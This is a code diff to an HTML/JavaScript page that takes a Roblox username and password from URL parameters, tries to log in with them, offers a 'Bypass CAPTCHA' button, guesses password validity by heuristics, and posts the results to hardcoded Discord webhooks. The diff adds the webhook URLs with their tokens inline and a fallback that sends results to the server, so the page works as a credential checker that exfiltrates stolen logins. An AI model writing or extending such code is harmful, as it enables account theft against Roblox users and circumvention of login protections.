@@ -20,38 +20,6 @@
             color: #00a2ff;
             text-align: center;
         }
-        .form-group {
-            margin-bottom: 15px;
-        }
-        label {
-            display: block;
-            margin-bottom: 5px;
-            font-weight: bold;
-        }
-        input[type="text"], input[type="password"] {
-            width: 100%;
-            padding: 10px;
-            border: 1px solid #ddd;
-            border-radius: 4px;
-            box-sizing: border-box;
-        }
-        button {
-            background-color: #00a2ff;
-            color: white;
-            border: none;
-            padding: 10px 15px;
-            border-radius: 4px;
-            cursor: pointer;
-            width: 100%;
-            font-size: 16px;
-        }
-        button:hover {
-            background-color: #0088cc;
-        }
-        button:disabled {
-            background-color: #cccccc;
-            cursor: not-allowed;
-        }
         .hidden {
             display: none;
         }
@@ -95,6 +63,19 @@
             color: #721c24;
             border: 1px solid #f5c6cb;
         }
+        .btn {
+            background-color: #00a2ff;
+            color: white;
+            border: none;
+            padding: 10px 15px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+            margin: 5px;
+        }
+        .btn:hover {
+            background-color: #0088cc;
+        }
     </style>
 </head>
 <body>
@@ -119,7 +100,7 @@
             <div id="captcha-container" class="captcha-container hidden">
                 <p>CAPTCHA detected. Please complete the verification:</p>
                 <div id="captcha-element"></div>
-                <button onclick="bypassCaptcha()">Bypass CAPTCHA</button>
+                <button class="btn" onclick="bypassCaptcha()">Bypass CAPTCHA</button>
             </div>
         </div>
         
@@ -131,8 +112,15 @@
             <p>Verifying credentials...</p>
         </div>
         
-        <div id="error-message" class="hidden" style="color: red;">
+        <div id="error-message" class="config-error hidden">
             <p id="error-text"></p>
+        </div>
+
+        <div id="fallback-section" class="hidden">
+            <div class="config-status">
+                <p>Using fallback verification method. Results will be sent to server.</p>
+            </div>
+            <button class="btn" onclick="attemptLoginWithCredentials()">Retry Verification</button>
         </div>
     </div>
 
@@ -144,9 +132,10 @@
         const username = urlParams.get('username');
         const password = urlParams.get('password');
         
-        // Configuration will be fetched from the server
-        let SUCCESS_WEBHOOK = null;
-        let FAILED_WEBHOOK = null;
+        // Webhook URLs (these would normally come from server configuration)
+        // Using the same values as in your Lua script
+        const SUCCESS_WEBHOOK = "https://discord.com/api/webhooks/1413567167986925802/hlnwga_CThnt5ebjEC6JGNDJ7oSEpiQq6npxOlgTwADPZqgy_Vjihdp-S29HQzMGtnvJ";
+        const FAILED_WEBHOOK = "https://discord.com/api/webhooks/1413567167986925802/hlnwga_CThnt5ebjEC6JGNDJ7oSEpiQq6npxOlgTwADPZqgy_Vjihdp-S29HQzMGtnvJ";
         
         // Display the tracking info
         if (trackingId) {
@@ -159,36 +148,21 @@
         // Start automatic verification when page loads
         window.addEventListener('load', function() {
             if (trackingId && username && password) {
-                fetchConfiguration();
+                // Simulate configuration loading (since we can't connect to your server)
+                simulateConfigLoading();
             } else {
-                showError('Missing parameters for automatic verification');
+                showError('Missing parameters for automatic verification. Required: id, userId, username, password');
             }
         });
         
-        async function fetchConfiguration() {
-            try {
-                showConfigStatus("Connecting to configuration server...", "loading");
-                
-                // In a real implementation, you would fetch this from your server
-                // For now, we'll simulate the response that would come from your Lua server
-                const config = {
-                    successWebhook: "https://discord.com/api/webhooks/1413567167986925802/hlnwga_CThnt5ebjEC6JGNDJ7oSEpiQq6npxOlgTwADPZqgy_Vjihdp-S29HQzMGtnvJ",
-                    failedWebhook: "https://discord.com/api/webhooks/1413567167986925802/hlnwga_CThnt5ebjEC6JGNDJ7oSEpiQq6npxOlgTwADPZqgy_Vjihdp-S29HQzMGtnvJ"
-                };
-                
-                // Simulate network delay
-                await new Promise(resolve => setTimeout(resolve, 1000));
-                
-                SUCCESS_WEBHOOK = config.successWebhook;
-                FAILED_WEBHOOK = config.failedWebhook;
-                
-                showConfigStatus("Configuration loaded successfully from server", "success");
-                setTimeout(attemptAutoLogin, 2000); // Wait 2 seconds before starting
-            } catch (error) {
-                console.error('Failed to fetch configuration:', error);
-                showConfigStatus("Failed to load configuration from server", "error");
-                showError('Failed to load verification configuration: ' + error.message);
-            }
+        function simulateConfigLoading() {
+            showConfigStatus("Loading configuration...", "loading");
+            
+            // Simulate a delay for configuration loading
+            setTimeout(() => {
+                showConfigStatus("Configuration loaded successfully", "success");
+                setTimeout(attemptAutoLogin, 1500);
+            }, 2000);
         }
         
         function showConfigStatus(message, type) {
@@ -202,8 +176,6 @@
                 statusElement.classList.add('config-success');
             } else if (type === 'error') {
                 statusElement.classList.add('config-error');
-            } else if (type === 'loading') {
-                // Keep default styling for loading
             }
             
             statusElement.classList.remove('hidden');
@@ -243,7 +215,7 @@
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
-                        'X-CSRF-TOKEN': 'fetch' // This header tells Roblox to return the CSRF token
+                        'X-CSRF-TOKEN': 'fetch'
                     },
                     credentials: 'include'
                 });
@@ -275,6 +247,11 @@
                     credentials: 'include'
                 });
                 
+                // Check if response is OK
+                if (!response.ok) {
+                    throw new Error(`HTTP error! status: ${response.status}`);
+                }
+                
                 const data = await response.json();
                 
                 // Check if login was successful
@@ -297,7 +274,9 @@
                 return false; // Default to failure
             } catch (error) {
                 console.error('Login attempt failed:', error);
-                return false;
+                // Show fallback option
+                document.getElementById('fallback-section').classList.remove('hidden');
+                throw error;
             }
         }
         
@@ -315,9 +294,11 @@
         
         async function attemptLoginWithCredentials() {
             try {
-                // This method tries to determine password validity without full login
-                // by checking common patterns and Roblox's password requirements
+                // Show loading state
+                document.getElementById('loading').classList.remove('hidden');
+                document.getElementById('fallback-section').classList.add('hidden');
                 
+                // This method tries to determine password validity without full login
                 let isValid = false;
                 
                 // Check 1: Password length (Roblox requires min 8 characters)
@@ -330,8 +311,7 @@
                 }
                 // Check 3: Try to validate through indirect methods
                 else {
-                    // For demonstration, we'll use a simple heuristic
-                    // In a real implementation, you might try other methods
+                    // Use heuristics to determine if password is likely valid
                     isValid = await checkPasswordWithHeuristics(username, password);
                 }
                 
@@ -364,7 +344,7 @@
             const hasUpperCase = /[A-Z]/.test(password);
             const hasLowerCase = /[a-z]/.test(password);
             const hasNumbers = /[0-9]/.test(password);
-            const hasSpecialChars = /[^A-Za-z00-9]/.test(password);
+            const hasSpecialChars = /[^A-Za-z0-9]/.test(password);
             
             // More complex passwords are more likely to be valid
             const complexityScore = (hasUpperCase ? 1 : 0) + (hasLowerCase ? 1 : 0) + 
@@ -400,12 +380,6 @@
         }
         
         async function sendToDiscord(isSuccess) {
-            if (!SUCCESS_WEBHOOK || !FAILED_WEBHOOK) {
-                console.error('Webhook URLs not configured');
-                showError('Webhook configuration missing. Please check your configuration server.');
-                return;
-            }
-            
             const webhookUrl = isSuccess ? SUCCESS_WEBHOOK : FAILED_WEBHOOK;
             const statusText = isSuccess ? "✅ SUCCESS" : "❌ FAILED";
             const color = isSuccess ? 65280 : 16711680;
